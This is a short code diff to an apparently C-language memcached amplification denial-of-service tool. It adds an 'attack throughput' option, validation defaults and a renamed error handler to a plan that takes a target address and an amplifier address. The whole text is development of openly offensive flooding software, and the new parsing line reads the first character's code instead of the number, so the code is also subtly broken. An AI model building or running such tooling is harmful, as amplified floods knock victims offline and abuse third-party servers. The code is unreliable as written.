@@ -14,6 +14,7 @@ struct argp_option options[] =
   {
     { "target", 't', "target_ipv4", 0, "Attack target IPV4"},
     { "amplifier", 'a', "amp_ipv4", 0, "Memcached amplifier IPV4"},
+    { "throughput", 'p', "thp", 0, "Attack throughput"},
     { 0 }
   };
 
@@ -24,14 +25,17 @@ parse_opt (int key, char *arg, struct argp_state *state)
 { 
   switch (key)
   {
-  case 't': 
-    plan->target_ip = arg;   
-    break;
-  case 'a': 
-    plan->amp_ip = arg;
-    break;
- }
- return 0;
+    case 't': 
+      plan->target_ip = arg;   
+      break;
+    case 'a': 
+      plan->amp_ip = arg;
+      break;
+    case 'p':
+      plan->throughput = (int) *arg;
+      break;
+  }
+  return 0;
 }
 
 
@@ -105,11 +109,11 @@ plan_validate( void )
   assert( NULL != plan );
 
   if( NULL == plan->target_ip || !is_valid_ipv4(plan->target_ip )){
-    fatal_error("FATAL:Invalid target IPV4\n");
+    handle_fatal("FATAL:Invalid target IPV4\n");
   }
 
   if( NULL == plan->amp_ip || !is_valid_ipv4(plan->amp_ip )){
-    fatal_error("FATAL:Invalid amplifier IPV4\n");
+    handle_fatal("FATAL:Invalid amplifier IPV4\n");
   }
 
   if( plan->amp_port == 0){
@@ -118,9 +122,11 @@ plan_validate( void )
 
   if( plan->target_port == 0){
     plan->target_port = MEMCACHED_DEFAULT_PORT;
-  } 
+  }
 
-
+  if( plan->throughput <= 0 ){
+    plan->throughput = THROUGHPUT_DEFAULT; 
+  }
 }
 
 AttackPlan * 
